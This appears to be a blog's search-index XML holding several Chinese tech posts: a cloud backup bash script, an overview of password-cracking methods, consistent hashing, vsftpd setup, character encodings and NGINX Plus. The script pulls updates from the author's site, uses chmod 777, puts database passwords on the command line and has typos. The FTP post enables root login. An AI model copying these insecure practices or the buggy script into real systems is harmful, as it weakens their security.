<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[关于学习方法的一些思考]]></title>
    <url>%2F2018%2F08%2F21%2Fessay%2Fessay-7%2F</url>
    <content type="text"><![CDATA[关于学习方法的一些思考 在构建自己的技术图谱中、添加了一个open messaging突然看到这个图 添加了一个open messaging 那么我要回忆每个消息组件 功能特性、使用场景、使用限制、有哪些危险、这大概就是方法论？ 渐渐的形成、我要做一个全新的东西、我需要面对什么样的问题、我需要解决什么样的问题 初次所有的东西都需要灵感？ 而成长的人拼的是 方式方法、这大概是荟萃、就像所有的所学留下的才是精华 计算机世界？ 从 硬件、【硬件的内存、存储容量】 运行系统、【win 、linux、mac】 支撑系统运行的文件系统形式、【ext、ntfs等等】 容器、虚拟机【在系统基础上 支撑更多兼容软件的运行】 软件、【软件开发者、软件运行内存、线程、】 软件运行需要环境【端口、网卡、协议通讯】 一个好的协议能够更好的承载和扩容通讯消息 一个好的网卡能够承载更多的请求量 端口则是软件监听器、也是软件的服务暴露接口 优化原理搞java得想学系统运行原理 mysql文档第八章【也可见本博客专栏《sql优化》】 mysql优化 必不可少、一举两得、 从文件IO并发量、线程、文件系统支撑文件IO量、软件配置、sql优化、缓存优化、 对于软件优化、在每个方面都有优化、相对于任何一款软件都可以从这几个方面入手优化 不同之处就是、优化的参数不一样]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[腾讯COS 阿里OSS 七牛 备份脚本]]></title>
    <url>%2F2018%2F08%2F20%2Fessay%2Fessay-4%2F</url>
    <content type="text"><![CDATA[腾讯COS 阿里OSS 七牛 备份脚本 #20171017:代码重构,支持将网站上传到腾讯云COS、阿里云OSS、七牛云存储.(v0.1.0) #20171018:修复cos.conf判断错误.(v0.1.1) #20171023:增加阿里云多站点备份.(v0.1.2) #20171025:增加腾讯云多站点备份.(v0.1.3) #20171029:修复阿里云下crontab不能正常上传bug(v0.1.4) #20171030:修复阿里云/腾讯云修改key后，备份报错问题。移动pip判断到相应位置（v0.1.5） #20171202:修复腾讯云与阿里云周期删除失败BUG(v0.1.6) #20171204:修复mysqldump某些小bug.(v0.1.7) #20180112:增加更新源地址、修改小bug(v0.1.8) #20180524:更新腾讯cos上传。(v0.1.9) #20180603:日常修复 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393#!/bin/bash#Scripts Name:itxg(beta)version=0.2.0#Owner:shengbao#Support URL:shengbao.org#Update URL:shengbao.org#Changelog:#20171017:代码重构,支持将网站上传到腾讯云COS、阿里云OSS、七牛云存储.(v0.1.0)#20171018:修复cos.conf判断错误.(v0.1.1)#20171023:增加阿里云多站点备份.(v0.1.2)#20171025:增加腾讯云多站点备份.(v0.1.3)#20171029:修复阿里云下crontab不能正常上传bug(v0.1.4)#20171030:修复阿里云/腾讯云修改key后，备份报错问题。移动pip判断到相应位置（v0.1.5）#20171202:修复腾讯云与阿里云周期删除失败BUG(v0.1.6)#20171204:修复mysqldump某些小bug.(v0.1.7)#20180112:增加更新源地址、修改小bug(v0.1.8)#20180524:更新腾讯cos上传。(v0.1.9)#20180603:日常修复stty erase &apos;^H&apos;backuptime=`date +%Y%m%d`rmbackuptime=`date -d &quot;-&quot;$rmdate&quot; days&quot; +%Y%m%d`#更新选项 case $1 in update) echo 正在下载更新,请稍后.... rm -rf itxg.sh &gt;&gt; /dev/null 2&gt;&amp;1 wget --spider -q -o /dev/null --tries=1 -T 5 shengbao.org if [ &quot;$?&quot; -eq 0 ];then wget https://shengbao.org/tools/itxg.sh else wget http://update.itxueguan.com/itxg.sh fi mv itxgt.sh $0 echo &quot;更新完毕.请重新运行&quot;$0&quot;&quot; exit 0 ;; esac#更新选项结束#判断是否存在更新版本v=`curl https://shengbao.org/tools/itxg.sh|awk NR==3|awk -F= &apos;&#123;print $2 &#125;&apos;`clearif [ `expr $version \&gt; $v` -eq 0 ] &amp;&amp; [ `expr $version \= $v` -eq 0 ];then echo 有更新,请退出后输入命令:sh &quot;$0&quot; update ,10秒后继续.... sleep 10else echo 无更新,2秒后继续... sleep 2fi#判断更新结束if [ ! -f itxg.conf ];thencat &gt;itxg.conf &lt;&lt;EOF####----公共----#####当前配置文件版本conf_version=$version#enable=tengxun为开启备份到腾讯,qiniu为备份到七牛,aliyun为备份到阿里云enable=#备份周期0天为不删除备份文件rmdate=0#开启数据库备份yes,nodb_enable=no#需要备份的网站目录，绝对路径末尾不需要加/backup_file=####----多站点----#####是否支持多站点,默认为关闭multistation=no#数字从0开始，因此2个站点该数字写1multisitenumber=1#上传到一个bucket下的不同目录,例如:shengbao itxueguanmultlist=(shengbao itxueguan)#多站点备份路径,2个站点路径中间以空格分割。绝对路径末尾不需要加/backup_filelist=(/data1 /data2)####----数据库----#####数据库用户名DB_USER=#数据库密码DB_PASS=#数据库连接地址DB_HOST=localhost#数据库名称DB_NAME=#多站点数据库名称列表multdblist=(shdb itxgdb)####----腾讯----#####你的bucket名称txbucketname=#腾讯secret_keytxsecret_key=#腾讯txappidtxappid=#腾讯访问api区域，北京一区华北(ap-beijing-1),北京(ap-beijing),华东(ap-shanghai),华南(ap-guangzhou),西南(ap-chengdu),新加坡(ap-singapore),香港(ap-hongkong),多伦多(na-toronto),法兰克福(eu-frankfurt)txregion=####----阿里云----#####你的bucket名称albucketname=#阿里云access_idalaccess_key_id=#阿里云secreret_keyalaccess_key_secret=#阿里云endpointalendpoint=####----七牛----#####你的证书IDqnak=#你的证书keyqnsk=#你的bucket名称qiniubucket=####----结束----####EOF echo &quot;5秒后退出,请编辑`pwd`/itxg.conf&quot; sleep 5 exit 0fi. ./itxg.confrmbackuptime=`date -d &quot;-&quot;$rmdate&quot; days&quot; +%Y%m%d`#判断itxg.conf文件是否被编辑if [ -z $enable ];then echo &quot;请先编辑:`pwd`/itxg.conf后执行&quot;$0&quot;&quot; sleep 3 exitfiif [ `expr $conf_version \&gt; $version` -eq 0 ] &amp;&amp; [ `expr $conf_version \= $version` -eq 0 ];then sed -i &quot;s/$conf_version/$version/g&quot; itxg.confelse echo &quot;配置文件版本为:&quot;$conf_version&quot;检查完毕&quot;fi#判断itxg.conf文件是否被编辑结束#判断本地空间是否满足需求if [ &quot;$multistation&quot; == no ];thendfs=`df |awk &apos;NR==2&apos;&apos;&#123;print $4&#125;&apos;`dus=`du -s /&quot;$backup_file&quot;|awk &apos;&#123;print $1&#125;&apos;`if [ &quot;$dfs&quot; -lt &quot;$dus&quot; ];then echo &quot;磁盘空间不能满足备份要求....2秒后退出&quot; sleep 2else echo &quot;磁盘空间检查完毕...&quot; sleep 2fifi#判断本地空间是否满足需求完毕#开始压缩需要备份的网站,并将压缩后文件保存在/itxg目录下qiniu_backup_file=/itxg/&quot;$backuptime&quot;.tar.gzif [ $db_enable = yes ];then if [ &quot;$multistation&quot; == no ];then /usr/local/mariadb/bin/mysqldump --opt -u$DB_USER -p$DB_PASS -h$DB_HOST $DB_NAME &gt; $backup_file/$backuptime.sql echo &quot;Warning: Using a password on the command line interface can be insecure.为正常&quot; fi if [ &quot;$multistation&quot; == yes ] &amp;&amp; [ ! -z &quot;$multisitenumber&quot; ];then for((msnb=0;msnb&lt;=&quot;$multisitenumber&quot;;msnb++));do /usr/local/mariadb/bin/mysqldump --opt -u$DB_USER -p$DB_PASS -h$DB_HOST $&#123;multdblist[&quot;$msnb&quot;]&#125; &gt; $&#123;backup_filelist[&quot;$msnb&quot;]&#125;/$backuptime.sql done fielse echo &quot;数据库备份关闭&quot;fiif [ &quot;$multistation&quot; == no ];then if [ ! -d /itxg ];then mkdir /itxg fi if [ -f /itxg/*.tar.gz ];then rm -rf /itxg/*.tar.gz echo &quot;删除上次本地备份,开始压缩文件... ...&quot; tar -czvf /itxg/&quot;$backuptime&quot;.tar.gz &quot;$backup_file&quot; &gt;&gt;/dev/null 2&gt;&amp;1 rm -rf $backup_file/$backuptime.sql echo &quot;压缩文件完成... ...&quot; else echo &quot;开始压缩文件... ...&quot; tar -czvf /itxg/&quot;$backuptime&quot;.tar.gz &quot;$backup_file&quot; &gt;&gt;/dev/null 2&gt;&amp;1 rm -rf $backup_file/$backuptime.sql.gz echo &quot;压缩文件完成... ...&quot; fifi#结束压缩小备份的网站，并将压缩后的文件保存在/itxg目录下#多站点压缩开始if [ &quot;$multistation&quot; == yes ] &amp;&amp; [ ! -z &quot;$multisitenumber&quot; ];then for((msnb=0;msnb&lt;=&quot;$multisitenumber&quot;;msnb++));do if [ ! -d &quot;/itxg/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;&quot; ];then mkdir -p /itxg/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot; fiif [ -f &quot;/itxg/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;&quot;/*.tar.gz ];then echo &quot;开始压缩文件... ... &quot; rm -rf &quot;/itxg/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;&quot;/*.tar.gz tar -czvf &quot;/itxg/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;&quot;/&quot;$backuptime&quot;.tar.gz &quot;$&#123;backup_filelist[&quot;$msnb&quot;]&#125;&quot; &gt;&gt;/dev/null 2&gt;&amp;1 rm -rf &quot;$&#123;backup_filelist[&quot;$msnb&quot;]&#125;&quot;/$backuptime.sqlelse echo &quot;开始压缩文件... ...&quot; tar -czvf &quot;/itxg/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;&quot;/&quot;$backuptime&quot;.tar.gz &quot;$&#123;backup_filelist[&quot;$msnb&quot;]&#125;&quot; &gt;&gt;/dev/null 2&gt;&amp;1 rm -rf &quot;$&#123;backup_filelist[&quot;$msnb&quot;]&#125;&quot;/$backuptime.sql.gzfi#数据库备份开始#数据库备份结束donefi#多站点压缩结束#腾讯云开始if [ &quot;$enable&quot; == tengxun ];then if [ -z &quot;$txbucketname&quot; ] &amp;&amp; [ -z &quot;$txaccess_id&quot; ] &amp;&amp; [ -z &quot;$txappid&quot; ] &amp;&amp; [ -z &quot;$txsecret_key&quot; ] &amp;&amp; [ -z &quot;$txregion&quot; ];then echo &quot;腾讯云配置检查失败&quot; exit 1 fi#检查coscmd环境 if [ -f /bin/coscmd ];then echo &quot;coscmd检测完毕&quot; else echo &quot;coscmd检测失败，开始安装.&quot;#检查pip环境if [ -f /bin/pip ];then echo &quot;pip检测完毕&quot;else echo &quot;pip检测失败，开始安装.&quot; yum install -y python-pip pip install --upgrade pipfi#检查pip环境结束 git clone https://github.com/tencentyun/coscmd.git cd coscmd &amp;&amp; python setup.py install fi#检查coscmd环境结束#检查./.cos.conf环境开始 if [ -f ~/.cos.conf ];then echo &quot;cos.conf检测完毕&quot; rm -rf ~/.cos.conf coscmd config -a &quot;$txappid&quot; -s &quot;$txsecret_key&quot; -b &quot;$txbucketname&quot; -r &quot;$txregion&quot; else echo &quot;cos.conf检测失败,开始安装.&quot; coscmd config -a &quot;$txappid&quot; -s &quot;$txsecret_key&quot; -b &quot;$txbucketname&quot; -r &quot;$txregion&quot; fi#检查./.cos.conf环境结求#上传开始 if [ &quot;$multistation&quot; == no ];then coscmd upload -r /itxg/&quot;$backuptime&quot;.tar.gz &quot;$backuptime&quot;.tar.gz &gt;/dev/null 2&gt;&amp;1# if [ &quot;$?&quot; -eq 0 ];then# echo &quot;腾讯云上传完成&quot;# elif [ &quot;$?&quot; -eq 255 ];then# echo &quot;腾讯云上传完成&quot;# else # echo &quot;腾讯云上传失败&quot;# fi fi if [ &quot;$multistation&quot; == yes ] &amp;&amp; [ ! -z &quot;$multisitenumber&quot; ];then for((msnb=0;msnb&lt;=&quot;$multisitenumber&quot;;msnb++));do coscmd upload -r &quot;/itxg/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;&quot;/&quot;$backuptime&quot;.tar.gz &quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$backuptime&quot;.tar.gz &gt;/dev/null# if [ &quot;$?&quot; -eq 0 ];then# echo &quot;腾讯云&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$backuptime&quot;.tar.gz上传完成&quot;# elif [ &quot;$?&quot; -eq 255 ];then# echo &quot;腾讯云&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$backuptime&quot;.tar.gz上传完成&quot;# else# echo &quot;腾讯云&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$backuptime&quot;.tar.gz上传失败&quot;# fi done fi#上传结束#腾讯云删除开始 if [ ! -z &quot;$rmdate&quot; ];then if [ &quot;$multistation&quot; == no ];then coscmd delete -f &quot;$rmbackuptime&quot;.tar.gz &gt;/dev/null if [ &quot;$?&quot; -eq 0 ];then echo &quot;腾讯云&quot;$txbucketname&quot;/&quot;$rmbackuptime&quot;.tar.gz删除结束&quot; elif [ &quot;$?&quot; -eq 255 ];then echo &quot;腾讯云&quot;$txbucketname&quot;/&quot;$rmbackuptime&quot;.tar.gz删除结束&quot; else echo &quot;腾讯云&quot;$txbucketname&quot;/&quot;$rmbackuptime&quot;.tar.gz删除失败&quot; fi fi if [ &quot;$multistation&quot; == yes ];then for((msnb=0;msnb&lt;=&quot;$multisitenumber&quot;;msnb++));do coscmd delete -f &quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$rmbackuptime&quot;.tar.gz &gt;/dev/null if [ &quot;$?&quot; -eq 0 ];then echo &quot;腾讯云&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$rmbackuptime&quot;.tar.gz删除结束&quot; elif [ &quot;$?&quot; -eq 255 ];then echo &quot;腾讯云&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$rmbackuptime&quot;.tar.gz删除结束&quot; else echo &quot;腾讯云&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$rmbackuptime&quot;.tar.gz删除失败&quot; fi done fi else echo &quot;备份周期为永久，请注意COS存储使用情况...&quot; fi#腾讯云删除结束fi#阿里云开始if [ &quot;$enable&quot; == aliyun ];then if [ -z &quot;$albucketname&quot; ] &amp;&amp; [ -z &quot;$alaccess_key_id&quot; ] &amp;&amp; [ -z &quot;$alaccess_key_secret&quot; ] &amp;&amp; [ -z &quot;$alendpoint&quot; ];then echo &quot;阿里云配置失败&quot; exit 1 fi if [ ! -f ./ossutil64 ];then wget http://docs-aliyun.cn-hangzhou.oss.aliyun-inc.com/assets/attach/50452/cn_zh/1506525299111/ossutil64?spm=5176.doc50452.2.3.7XHxTz mv ossutil64?spm=5176.doc50452.2.3.7XHxTz ossutil64 chmod 777 ossutil64 fi#阿里云配置检查 if [ -f .ossutilconfig ];then echo &quot;ossutil配置检测完毕&quot; rm -rf `pwd`/.ossutilconfig `pwd`/./ossutil64 config -e &quot;$alendpoint&quot; -i &quot;$alaccess_key_id&quot; -k &quot;$alaccess_key_secret&quot; -L EN else echo &quot;ossutil配置检测失败,开始配置&quot; `pwd`/./ossutil64 config -e &quot;$alendpoint&quot; -i &quot;$alaccess_key_id&quot; -k &quot;$alaccess_key_secret&quot; -L EN fi#阿里云配置检查结束#阿里云上传开始 if [ &quot;$multistation&quot; == no ];then `pwd`/./ossutil64 cp -f /itxg/&quot;$backuptime&quot;.tar.gz oss://&quot;$albucketname&quot; if [ &quot;$?&quot; -eq 0 ];then echo &quot;阿里云&quot;$backuptime&quot;.tar.gz上传完成&quot; elif [ &quot;$?&quot; -eq 255 ];then echo &quot;阿里云&quot;$backuptime&quot;.tar.gz上传完成&quot; else echo &quot;阿里云&quot;$backuptime&quot;.tar.gz上传失败&quot; fi fi if [ &quot;$multistation&quot; == yes ] &amp;&amp; [ ! -z &quot;$multisitenumber&quot; ];then for((msnb=0;msnb&lt;=&quot;$multisitenumber&quot;;msnb++));do `pwd`/./ossutil64 cp -f &quot;/itxg/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;&quot;/&quot;$backuptime&quot;.tar.gz oss://&quot;$albucketname&quot;/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/ &gt;/dev/null if [ &quot;$?&quot; -eq 0 ];then echo &quot;阿里云&quot;$albucketname&quot;/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$backuptime&quot;.tar.gz上传完成&quot; elif [ &quot;$?&quot; -eq 255 ];then echo &quot;阿里云&quot;$albucketname&quot;/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$backuptime&quot;.tar.gz上传完成&quot; else echo &quot;阿里云&quot;$albucketname&quot;/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$backuptime&quot;.tar.gz上传失败&quot; fi done fi#阿里云上传结束#阿里云删除开始if [ ! -z &quot;$rmdate&quot; ];then if [ &quot;$multistation&quot; == no ];then `pwd`/./ossutil64 rm oss://&quot;$albucketname&quot;/&quot;$rmbackuptime&quot;.tar.gz &gt;/dev/null if [ &quot;$?&quot; -eq 0 ];then echo &quot;阿里云&quot;$albucketname&quot;/&quot;$rmbackuptime&quot;.tar.gz删除结束&quot; elif [ &quot;$?&quot; -eq 255 ];then echo &quot;阿里云&quot;$albucketname&quot;/&quot;$rmbackuptime&quot;.tar.gz删除结束&quot; else echo &quot;阿里云&quot;$albucketname&quot;/&quot;$rmbackuptime&quot;.tar.gz删除失败&quot; fi fi if [ &quot;$multistation&quot; == yes ] &amp;&amp; [ ! -z &quot;$multisitenumber&quot; ];then for((msnb=0;msnb&lt;=&quot;$multisitenumber&quot;;msnb++));do `pwd`/./ossutil64 rm oss://&quot;$albucketname&quot;/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$rmbackuptime&quot;.tar.gz &gt;/dev/null if [ &quot;$?&quot; -eq 0 ];then echo &quot;阿里云&quot;$albucketname&quot;/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$rmbackuptime&quot;.tar.gz删除结束&quot; elif [ &quot;$?&quot; -eq 255 ];then echo &quot;阿里云&quot;$albucketname&quot;/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$rmbackuptime&quot;.tar.gz删除结束&quot; else echo &quot;阿里云&quot;$albucketname&quot;/&quot;$&#123;multlist[&quot;$msnb&quot;]&#125;&quot;/&quot;$rmbackuptime&quot;.tar.gz删除失败&quot; fi done fielse echo &quot;备份周期为永久，请注意OSS存储使用情况...&quot; fifi#阿里云删除结束#七牛云开始#判断是否是七牛云上传if [ &quot;$enable&quot; == qiniu ];then if [ -z &quot;$qnak&quot; ] &amp;&amp; [ -z &quot;$qnsk&quot; ] &amp;&amp; [ -z &quot;$qiniubucket&quot; ];then echo &quot;七牛云配置检查失败&quot; exit 1 fi if [ ! -f ./qshell-linux-x64 ];then wget https://dn-devtools.qbox.me/2.1.5/qshell-linux-x64 &gt;/dev/null 2&gt;&amp;1 chmod 755 qshell-linux-x64 echo &quot;七牛云安装完成&quot; fi./qshell-linux-x64 account &quot;$qnak&quot; &quot;$qnsk&quot; echo &quot;开始上传...&quot;./qshell-linux-x64 rput &quot;$qiniubucket&quot; &quot;$backuptime&quot;.tar.gz /itxg/&quot;$backuptime&quot;.tar.gz if [ &quot;$?&quot; -eq 0 ];then echo &quot;七牛云上传完成&quot; else echo &quot;七牛云上传失败&quot; fi#七牛云删除开始 if [ ! -z &quot;$rmdate&quot; ];then ./qshell-linux-x64 delete &quot;$qiniubacket&quot; &quot;$rmbackuptime&quot;.tar.gz &gt; /dev/null if [ &quot;$?&quot; -eq 0 ];then echo &quot;七牛云删除结束&quot; else echo &quot;七牛云删除失败&quot; fi else echo &quot;备份周期为永久，请注意七牛存储使用情况...&quot; fifi]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[破解密码常见的几种方式]]></title>
    <url>%2F2018%2F07%2F13%2Fencryption%2Fpassword-cracked%2F</url>
    <content type="text"><![CDATA[暴力穷举使用字典生成常用密码序列进行密码尝试 击键记录使用密码病毒获取输入工具点击操作 屏幕记录使用密码病毒获取屏幕点击记录 网络钓鱼使用伪造站点获取用户密码 嗅探器【sniffer】使用网络监听工具获取获取网络消息 系统漏洞使用系统漏洞进行shell操作、然后在进行以上获取密码操作、 如：键盘、屏幕工具录入、或者文件下载、直接查看文件密码等 远程攻击分为两种：远程入侵和破坏性攻击 远程获取目标主机shell 进行监控、文件download等 dos、ddos、等等 不良习惯多网站使用同一密码 使用简单密码 使用常用单词、 长期不更换密码 绕过破解常见：拦截cookie、session攻击等 密码心理学社会工程学破解密码 简单来讲就是、站在对方的角度上去设置密码、然后猜解密码、 一个密码会跟人生经历有很大关系、 一个人也不会用没碰到过的、没见过的东西作为密码 举几个例子： 某公司密码 可能是 公司大写或者小写+当年年份 某家路由器密码可能是：他或者他老婆姓名【姓氏】+生日、或者常见数字 破结果一个wifi 跑字典出来是 11121314 12131415 你觉得很安全 谁会想到我这么个序列作为密码、其实字典就是一个小时的功夫]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>密码加密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hash环、一致性hash]]></title>
    <url>%2F2018%2F07%2F10%2Fessay%2Fhash%2F</url>
    <content type="text"><![CDATA[hash环、一致性hash Hash环 上面说的Hash函数，只经过了1次hash，即把key hash到对应的机器编号。而Hash环有2次Hash： （1）把所有机器编号hash到这个环上 （2）把key也hash到这个环上。然后在这个环上进行匹配，看这个key和哪台机器匹配。 具体来讲，如下： 假定有这样一个Hash函数，其值空间为（0到2的32次方-1) ，也就是说，其hash值是个32位无整型数字 ，这些数字组成一个环。 然后，先对机器进行hash(比如根据机器的ip)，算出每台机器在这个环上的位置； 再对key进行hash，算出该key在环上的位置， 然后从这个位置往前走，遇到的第一台机器就是该key对应的机器，就把该(key, value) 存储到该机器上。 首先计算出每台Cache服务器在环上的位置（图中的大圆圈）；然后每来一个(key, value)，计算出在环上的位置（图中的小圆圈）， 然后顺时针走，遇到的第1个机器，就是其要存储的机器。 这里的关键点是：当你增加/减少机器时，其他机器在环上的位置并不会发生改变。这样只有增加的那台机器、 或者减少的那台机器附近的数据会失效，其他机器上的数据都还是有效的。 数据倾斜问题 当你机器不多的时候，很可能出现几台机器在环上面贴的很近，不是在环上均匀分布。这将会导致大部分数据，都会集中在某1台机器上。 为了解决这个问题，可以引入“虚拟机器”的概念，也就是说：1台机器，我在环上面计算出多个位置。 怎么弄呢？ 假设用机器的ip来hash，我可以在ip后面加上几个编号, ip_1, ip_2, ip_3, .. 把1台物理机器生个多个虚拟机器的编号。 数据首先映射到“虚拟机器上”，再从“虚拟机器”映射到物理机器上。 因为虚拟机器可以很多，在环上面均匀分布，从而保证数据均匀分布到物理机器上面。 ZK的引入 上面我们提到了服务器的机器增加、减少，问题是客户端怎么知道呢？ 一种笨办法就是手动的，当服务器机器增加、减少时候，重新配置客户端，重启客户端。 另外一种，就是引入ZK，服务器的节点列表注册到ZK上面，客户端监听ZK。发现结点数发生变化，自动更新自己的配置。 当然，不用ZK，用一个其他的中心结点，只要能实现这种更改的通知，也是可以的。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[随便写点]]></title>
    <url>%2F2018%2F07%2F06%2Fessay%2Fessay-2%2F</url>
    <content type="text"><![CDATA[spring cloud 刚刚上了生产 service mesh、事件驱动架构、来了 rest刚刚成为普遍api规范 GraphQL来了 更NB的是 Netflix 停止维护了eureka、出了个 “混沌工程” 大公司的技术就像是生产苹果的、小公司的技术就是跟着屁股后头捡捡苹果核儿、、、 大公司吃完了苹果、吃核桃、换着花样吃、小公司跟后头就吃各种核儿、、哈哈、所以一定要进大公司耍耍去、若能玩顶尖的技术、岂不妙哉？ infoq地址 技术更迭的真快、现在还有精力去学习、以后也就看看虎形而已了、 谁说程序员的工资好挣的、一不留神就失业没人要的工作、惶惶度日、不会学习的程序员就是温水的青蛙、安乐死…]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ftp部署]]></title>
    <url>%2F2018%2F07%2F04%2Fservice-deploy%2Fftp%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637381、首先服务器要安装ftp软件,查看是否已经安装ftp软件下： #which vsftpd 如果看到有vsftpd的目录说明服务器已经安装了ftp软件2、查看ftp 服务器状态 #service vsftpd status3、如果没有安装，查询是否有可用的rpm安装包[root@centos ~]# yum list |grep vsftpdvsftpd.i686 2.2.2-21.el6 base4、安装vsftpd服务[root@centos ~]# yum install -y vsftpd5. 启动ftp服务器 #service vsftpd start6. 重启ftp服务器 #service vsftpd restart7. 查看服务有没有启动 [root@centos ~]# netstat -lnp tcp 0 0 0.0.0.0:21 0.0.0.0:* LISTEN 1491/vsftpd 如果看到以上信息，证明ftp服务已经开启。8.如果需要开启root用户的ftp权限要修改以下两个文件 #vi /etc/vsftpd/ftpusers中注释掉root #vi /etc/vsftpd/user_list中也注释掉root 然后重新启动ftp服务[root@centos ~]# service vsftpd restart]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>服务搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于编码方式]]></title>
    <url>%2F2018%2F07%2F03%2Fessay%2Fessay-11%2F</url>
    <content type="text"><![CDATA[编码 将人类语言解释为机器语言的一种关系映射 常见编码方式 ASCII 128个 0-31控制字符、换行、删除、回车 32-126打印字符 ISO8859-1 在ASCII上 加上了大多数修语言字符、256个字符 GB2312 信息交换用汉字编码字符集基本集、双字节编码、 A1-A9 符号区 B0-F7 汉字区 GBK 汉字内码扩展规范 对GB2312扩展 编码范围 8140-FEFE 与GB2312兼容 GB18030 数字交换用汉字编码字符集 单字节、双字节、四字节、与GB2312兼容 UTF-16 Unicode字符集的存取方法 使用2字节标识Unicode转化格式、定长表示 UTF-8 边长字符集、1-6个字节 涵盖了所有各国字符编码 UTF-8mb4 在UTF8基础上 增加了表情字符]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx-plus]]></title>
    <url>%2F2018%2F07%2F03%2Fload-balance%2Fnginx-plus%2F</url>
    <content type="text"><![CDATA[好用软件推荐简化部署、多云环境更容易发现服务的故障结合nginx-controller非常好用软件官方网站-nginx-plus 简介 NGINX Plus是一个基于开源NGINX构建的软件负载均衡器，Web服务器和内容缓存。 NGINX Plus在开源产品的基础上提供独家的生产就绪功能，包括会话持久性，通过API配置和主动健康检查。 使用NGINX Plus代替硬件负载均衡器，获得创新的自由，而不受基础设施的限制。 功能负载均衡器 使用软件扩展传统的负载平衡： HTTP，TCP和UDP负载平衡 使用URI，cookie，args等进行第7层请求路由 基于cookie的会话持久性* 状态代码和响应正文的主动运行状况检查* 使用DNS *进行服务发现 内容缓存 使用为世界上最大的CDN提供支持的相同缓存： 缓存静态和动态内容 通过微处理提高动态内容性能 在后台重新验证时提供“陈旧”内容以提高性能 覆盖或设置Cache‑Control标题 使用缓存清除API轻松管理缓存* 网络服务器 以无与伦比的速度和效率交付静态资产： 同时处理数十万客户 使用比其他Web服务器少90％的内存 反向代理多个协议：HTTP，gRPC，Memcached，PHP-FPM，SCGI，uwsgi 流HTTP视频：FLV，HDS，HLS，MP4 支持HTTP / 2服务器推送的HTTP / 2网关 安全控制 保护您的应用： 请求/连接限制 双栈RSA / ECC SSL卸载 IP访问控制列表（ACL） API和OpenID Connect单点登录（SSO）的JWT身份验证* NGINX WAF动态模块* 动态模块 动态插入其他功能： 用于JavaScript配置的nginScript模块 GeoIP模块按IP地址定位用户（需要MaxMind GeoIP数据库） 用于编译自己的自定义模块的构建工具 单点登录模块：ForgeRock，IDF Connect和Ping Identity * 动态模块库* 监控 诊断和调试复杂的应用程序体系结构： 使用NGINX Amplify监控NGINX指标并验证配置 适用于AppDynamics，Datadog，Dynatrace和New Relic的插件 具有超过90个唯一指标的扩展状态* 内置实时图形仪表板* 用于与自定义监视工具集成的JSON和HTML输出* 高可用性（HA） 可扩展且可靠的HA部署： 主动 - 主动和主动 - 被动HA模式 群集中服务器之间的配置同步 使用内置脚本轻松安装 状态共享Sticky Learn会话持久性 Kubernetes Ingress控制器 使用NGINX Plus创建Kubernetes应用程序： 具有SSL / TLS终止的负载平衡 WebSocket和HTTP / 2支持 请求之前的URI重写被转发到应用程序 会话持久性* JWT认证* 可编程 动态部署自定义体系结构： 用于脚本和高级配置的NGINX JavaScript模块 Lua脚本语言 Ansible，Chef和Puppet集成 用于管理上游服务器，键值存储和实时指标的API * 无需重新加载的动态重新配置* 流媒体 Scalably提供流媒体： 直播：RTMP，Apple HTTP直播（HLS），HTTP上的动态自适应流媒体（DASH） 视频点播：Flash（flv），MP4 自适应比特率VOD：HLS，Adobe HTTP动态流（HDS）* 